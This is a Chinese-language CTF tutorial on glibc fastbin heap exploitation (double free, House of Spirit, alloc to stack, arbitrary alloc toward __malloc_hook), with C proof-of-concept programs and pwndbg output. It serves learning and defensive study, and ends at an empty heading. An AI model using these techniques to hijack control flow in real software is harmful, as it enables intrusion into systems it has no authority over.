# Fastbin Attack

Fastbin Attack 指基于 fastbin 机制的一类漏洞利用方法。前提如下：

1. 存在堆溢出、UFA等能控制chunk内容的漏洞
2. 漏洞发生在fastbin类型的chunk中

主要为四类：

1. Fastbin Double Free
2. House of Spirit
3. Alloc to Stack
4. Arbitrary Alloc

其中，前两种主要漏洞侧重于利用 free 函数释放真的 chunk 或伪造的 chunk，然后再次申请 chunk 进行攻击，后两种侧重于故意修改 fd 指针，直接利用 malloc 申请指定位置 chunk 进行攻击

## 原理

fastbin attack 存在的原因在于 fastbin 是使用单链表来维护释放的堆块的，并且由 fastbin 管理的 chunk 即使被释放，其 next_chunk 的 prev_inuse 位也不会被清空。
例，

```c++
int main(void)
{
    void *chunk1,*chunk2,*chunk3;
    chunk1=malloc(0x30);
    chunk2=malloc(0x30);
    chunk3=malloc(0x30);
    free(chunk1);
    free(chunk2);
    free(chunk3);
    return 0;
}
```

释放前：

![Alt](img/wiki-FastbinAttack1.png)

释放后：
此时位于 main_arena 中的 fastbin 链表中已经储存了指向 chunk3 的指针，并且 chunk 3、2、1 构成了一个单链表

![Alt](img/wiki-FastbinAttack2.png)
![Alt](img/wiki-FastbinAttack3.png)

## Fastbin Double Free

Fastbin Double Free 是指 fastbin 的 chunk 可以被多次释放，因此可以在 fastbin 链表中存在多次(释放后申请）。这样导致的后果是多次分配可以从 fastbin 链表中取出同一个堆块，相当于多个指针指向同一个堆块，结合堆块的数据内容可以实现类似于类型混淆 (type confused) 的效果。
Fastbin Double Free可以成功利用的原因：

1. fastbin 的堆块被释放后 next_chunk 的 pre_inuse 不会被清空
2. fastbin 在执行free的时候仅验证了 main_arena 直接指向的块，即链表指针头部的块，对于后面的块不会验证

```c++
/* Another simple check: make sure the top of the bin is not the
       record we are going to add (i.e., double free).  */
    if (__builtin_expect (old == p, 0))
      {
        errstr = "double free or corruption (fasttop)";
        goto errout;
}
```

### 示例1

```c++
int main(void)
{
    void *chunk1,*chunk2,*chunk3;
    chunk1=malloc(0x10);
    chunk2=malloc(0x10);

    free(chunk1);
    free(chunk1);
    return 0;
}
```

编译执行后，_int_free 函数会检测到 fastbin 的 double free。

![Alt](img/wiki-FastbinAttack4.png)

在chunk1释放之后释放chunk2，然后再释放chunk1，就不会被检测到（此时main_arena（fastbin的head） 指向chunk2而不是指向chunk1）

```c++
int main(void)
{
    void *chunk1,*chunk2,*chunk3;
    chunk1=malloc(0x10);
    chunk2=malloc(0x10);

    free(chunk1);
    free(chunk2);
    free(chunk1);
    return 0;
}
```

![Alt](img/wiki-FastbinAttack5.png)

因为chunk1 被再次释放，所以其fd值不再为0而是指向chunk2（再次free(chunk1)时，因为chunk1会被添加到链首，所以chunk1的fd指向chunk2），此时如果可以控制chunk1的内容，便可以写入其fd指针，从而实现任意地址分配fastbin块。

```c++
typedef struct _chunk
{
    long long pre_size;
    long long size;
    long long fd;
    long long bk;
} CHUNK,*PCHUNK;

CHUNK bss_chunk;

int main(void)
{
    void *chunk1,*chunk2,*chunk3;
    void *chunk_a,*chunk_b;

    bss_chunk.size=0x21;
    chunk1=malloc(0x10);
    chunk2=malloc(0x10);

    free(chunk1);
    free(chunk2);
    free(chunk1);

    chunk_a=malloc(0x10);
    // 分配得到最近释放的fastbin
    *(long long *)chunk_a=&bss_chunk;
    // 修改fd指针指向bss_chunk
    malloc(0x10);
    // 得到chunk2，此时由于chunk1的fd指针指向bss_chunk,所以fastbin链表中还有两个chunk（0x602000 —▸ 0x601080 (bss_chunk) ）
    malloc(0x10);
    // chunk1 被分配出去，只剩下bss_chunk
    chunk_b=malloc(0x10);
    printf("chunk_b = %p\n",chunk_b);
    return 0;
}

```

修改之后heap的布局如下：

```s
pwndbg> parseheap
addr                prev                size                 status              fd                bk
0x602000            0x0                 0x20                 Used                None              None
0x602020            0x0                 0x20                 Used                None              None
pwndbg> x/16g 0x602000
0x602000:   0x0000000000000000  0x0000000000000021
0x602010:   0x0000000000601080  0x0000000000000000
0x602020:   0x0000000000000000  0x0000000000000021
0x602030:   0x0000000000602000  0x0000000000000000
0x602040:   0x0000000000000000  0x0000000000020fc1
0x602050:   0x0000000000000000  0x0000000000000000
0x602060:   0x0000000000000000  0x0000000000000000
0x602070:   0x0000000000000000  0x0000000000000000
pwndbg> x   g 0x00000000006010  0
0x601080 <bss_chunk>:   0x0000000000000000  0x0000000000000021
0x601090 <bss_chunk+16>:    0x0000000000000000  0x0000000000000000
0x6010a0:   0x0000000000000000  0x0000000000000000
0x6010b0:   0x0000000000000000  0x0000000000000000
0x6010c0:   0x0000000000000000  0x0000000000000000
0x6010d0:   0x0000000000000000  0x0000000000000000
0x6010e0:   0x0000000000000000  0x0000000000000000
0x6010f0:   0x0000000000000000  0x0000000000000000
```

首先先构造 `main_arena -> chunk1 -> chunk2 -> chunk1`的fastbin链表。然后调用malloc返回chunk1之后修改chunk1的fd指针指向bss段上的bss_chunk,之后再malloc时就会分配到bss_chunk

编译后输出如下：

![Alt](img/wiki-FastbinAttack6.png)

> main函数中设置`bss_chunk.size=0x21;`是因为 _int_malloc 会对欲分配位置的 size 域进行验证，如果其 size 与当前 fastbin 链表应有 size 不符就会抛出异常

![Alt](img/wiki-FastbinAttack7.png)

_int_malloc 中的校验：

```c++
if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0))
    {
      errstr = "malloc(): memory corruption (fast)";
    errout:
      malloc_printerr (check_action, errstr, chunk2mem (victim));
      return NULL;
}
```

通过 fastbin double free 可以使用多个指针控制同一个堆块，这可以用于篡改一些堆块中的关键数据域或者是实现类似于类型混淆的效果。 如果更进一步修改 fd 指针，则能够实现任意地址分配堆块的效果 (首先要通过验证)，这就相当于任意地址写任意值的效果。

## House Of Spirit

在目标位置处伪造 fastbin chunk，并将其释放，从而达到分配指定地址的 chunk 的目的。

要想构造 fastbin fake chunk，并且将其释放时，可以将其放入到对应的 fastbin 链表中，需要绕过一些必要的检测，即

- fake chunk 的 ISMMAP 位不能为 1，因为 free 时，如果是 mmap 的 chunk，会单独处理。
- fake chunk 地址需要对齐， MALLOC_ALIGN_MASK
- fake chunk 的 size 大小需要满足对应的 fastbin 的需求，同时也得对齐。
- fake chunk 的 next chunk 的大小不能小于 2 * SIZE_SZ，同时也不能大于av->system_mem 。
- fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况。

> 总的来说就是创建一个 fake chunk， 通过覆盖指针指向这个fake chunk（以特定的方式及设置size和下一个chunk的size绕过安全检查）。当释放fake chunk时，他被插入到bin list中，再次malloc时就会返回fake chunk。

House Of Spirit，并不需要修改指定地址的任何内容，关键是要能够修改指定地址的前后的内容使其可以绕过对应的检测。

## Alloc to Stack

劫持 fastbin 链表中 chunk 的 fd 指针，把 fd 指针指向我们想要分配的栈上，从而实现控制栈中的一些关键数据，比如返回地址等

### 示例2

```c++
typedef struct _chunk
{
    long long pre_size;
    long long size;
    long long fd;
    long long bk;
} CHUNK,*PCHUNK;

int main(void)
{
    CHUNK stack_chunk;

    void *chunk1;
    void *chunk_a;

    stack_chunk.size=0x21;
    chunk1=malloc(0x10);

    free(chunk1);

    *(long long *)chunk1=&stack_chunk;
    malloc(0x10);
    chunk_a=malloc(0x10);
    return 0;
}
```

malloc之后，stack_chunk的地址（栈）成功写入到chunk1的fd指针（chunk1被释放，user data的前8个字节为fd指针），且此时fast bin中已经存在stuck_chunk

```s
In file: /home/nop/Desktop/test.c
   17     chunk1=malloc(0x10);
   18
   19     free(chunk1);
   20
   21     *(long long *)chunk1=&stack_chunk;
 ► 22     malloc(0x10);
   23     chunk_a=malloc(0x10);
   24     return 0;
   25 }
─────────────────────────────────────────────────────────────────────────────────────────────────
......
pwndbg> x/16g 0x602000
0x602000:   0x0000000000000000  0x0000000000000021
0x602010:   0x00007fffffffdc60  0x0000000000000000
0x602020:   0x0000000000000000  0x0000000000020fe1
0x602030:   0x0000000000000000  0x0000000000000000
0x602040:   0x0000000000000000  0x0000000000000000
0x602050:   0x0000000000000000  0x0000000000000000
0x602060:   0x0000000000000000  0x0000000000000000
0x602070:   0x0000000000000000  0x0000000000000000
pwndbg> fast
fastbins
0x20: 0x602000 —▸ 0x7fffffffdc60 —▸ 0x400650 (__libc_csu_init) ◂— and    byte ptr [rax], al /* ' ' */
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
pwndbg>
```

之后第二次malloc成功返回stack_chunk(0x7fffffffdc60+0x10(prev_size,size))

```s
─────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────────────────────────────────────────────
   0x40061a <main+68>     mov    edi, 0x10
   0x40061f <main+73>     call   malloc@plt <0x4004c0>

   0x400624 <main+78>     mov    edi, 0x10
   0x400629 <main+83>     call   malloc@plt <0x4004c0>

   0x40062e <main+88>     mov    qword ptr [rbp - 0x38], rax
 ► 0x400632 <main+92>     mov    eax, 0
   0x400637 <main+97>     mov    rcx, qword ptr [rbp - 8]
   0x40063b <main+101>    xor    rcx, qword ptr fs:[0x28]
   0x400644 <main+110>    je     main+117 <0x40064b>
    ↓
   0x40064b <main+117>    leave  
   0x40064c <main+118>    ret
─────────────────────────────────────────────────────────────────────────────────────────────[ SOURCE (CODE) ]──────────────────────────────────────────────────────────────────────────────────────────────
In file: /home/nop/Desktop/test.c
   19     free(chunk1);
   20 
   21     *(long long *)chunk1=&stack_chunk;
   22     malloc(0x10);
   23     chunk_a=malloc(0x10);
 ► 24     return 0;
   25 }
─────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp      0x7fffffffdc50 —▸ 0x602010 —▸ 0x7fffffffdc60 —▸ 0x7fffffffdc8e ◂— 0x400650572d
01:0008│          0x7fffffffdc58 —▸ 0x7fffffffdc70 —▸ 0x400650 (__libc_csu_init) ◂— push   r15
02:0010│          0x7fffffffdc60 —▸ 0x7fffffffdc8e ◂— 0x400650572d
03:0018│          0x7fffffffdc68 ◂— 0x21 /* '!' */
04:0020│ rax rdx  0x7fffffffdc70 —▸ 0x400650 (__libc_csu_init) ◂— push   r15
05:0028│          0x7fffffffdc78 —▸ 0x4004e0 (_start) ◂— xor    ebp, ebp
06:0030│          0x7fffffffdc80 —▸ 0x7fffffffdd70 ◂— 0x1
07:0038│          0x7fffffffdc88 ◂— 0x572d050368fbbe00
───────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────────────────
 ► f 0           400632 main+92
   f 1     7ffff7a2d830 __libc_start_main+240
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> fast
fastbins
0x20: 0x400650 (__libc_csu_init) ◂— and    byte ptr [rax], al /* ' ' */
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
pwndbg> p $rbp-0x38
$4 = (void *) 0x7fffffffdc58
pwndbg> x/x 0x7fffffffdc58
0x7fffffffdc58: 0x00007fffffffdc70
pwndbg>
```

把 fastbin chunk 分配到栈中，从而控制返回地址等关键数据。要实现这一点需要劫持 fastbin 中 chunk 的 fd 域，把它指到栈上，同时需要栈上存在有满足条件的 size 值

## Arbitrary Alloc

Arbitrary Alloc 其实与 Alloc to stack 是完全相同的，唯一的区别是分配的目标不再是栈中。 事实上只要满足目标地址存在合法的 size 域，就可以可以把 chunk 分配到任意的可写内存中，比如 bss、heap、data、stack 等。

### 示例3

```c++
// 使用字节错位来实现直接分配 fastbin 到_malloc_hook 的位置，相当于覆盖_malloc_hook 来控制程序流程。
int main(void)
{
    void *chunk1;
    void *chunk_a;

    chunk1=malloc(0x60);

    free(chunk1);

    *(long long *)chunk1=0x7ffff7dd1af5-0x8;
    malloc(0x60);
    chunk_a=malloc(0x60);
    return 0;
}
```

开始之前需要调试得到__malloc_hook的地址：

```s
Breakpoint main
pwndbg> search __malloc_hook
libc-2.23.so    0x7ffff7a20c96 pop    rdi /* '__malloc_hook' */
warning: Unable to access 16000 bytes of target memory at 0x7ffff7bd4d0c, halting search.
pwndbg>
```

接着要观察欲写入地址附近是否存在可以字节错位的情况，即通过得到的malloc_hook的地址向上回溯观察是否可以错位构造出一个合理的size（本机调试时并未能找到合适的size域，所以以下内容为ctf-wiki中的数据）
__malloc_hook的地址为0x7ffff7dd1b10

```s
0x7ffff7dd1a88 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
0x7ffff7dd1a90 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
0x7ffff7dd1a98 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
0x7ffff7dd1aa0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
0x7ffff7dd1aa8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
0x7ffff7dd1ab0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
0x7ffff7dd1ab8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
0x7ffff7dd1ac0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
0x7ffff7dd1ac8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
0x7ffff7dd1ad0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
0x7ffff7dd1ad8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
0x7ffff7dd1ae0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
0x7ffff7dd1ae8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
0x7ffff7dd1af0 0x60 0x2 0xdd 0xf7 0xff 0x7f 0x0 0x0
0x7ffff7dd1af8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
0x7ffff7dd1b00 0x20 0x2e 0xa9 0xf7 0xff 0x7f 0x0 0x0
0x7ffff7dd1b08 0x0  0x2a 0xa9 0xf7 0xff 0x7f 0x0 0x0
0x7ffff7dd1b10 <__malloc_hook>: 0x30    0x28    0xa9    0xf7    0xff    0x7f    0x0 0x0
```

向上回溯可以发现从0x7ffff7dd1af5开始刚好可以构成 0x000000000000007f（小端序），即0x7ffff7dd1af5~7ffff7dd1afc
64位fast bin大小如下：

```s
//这里的size指用户区域，因此要小2倍SIZE_SZ
Fastbins[idx=0, size=0x10]
Fastbins[idx=1, size=0x20]
Fastbins[idx=2, size=0x30]
Fastbins[idx=3, size=0x40]
Fastbins[idx=4, size=0x50]
Fastbins[idx=5, size=0x60]
Fastbins[idx=6, size=0x70]
```

0x7f 在计算 fastbin index 时，是属于 index 5 的，即 chunk 大小为 0x70 的,而其大小又包含了 0x10 的 chunk_header，因此分配 0x60 的 fastbin，将其加入链表。 最后经过两次分配可以观察到 chunk 被分配到 0x7ffff7dd1afd，进而就可以直接控制 __malloc_hook 的内容

```c
// 注意 sz 的大小是 unsigned int，因此只占 4 个字节
#define fastbin_index(sz) ((((unsigned int) (sz)) >> (SIZE_SZ == 8 ? 4 : 3)) - 2)
```

## 2014 hack.lu oreo
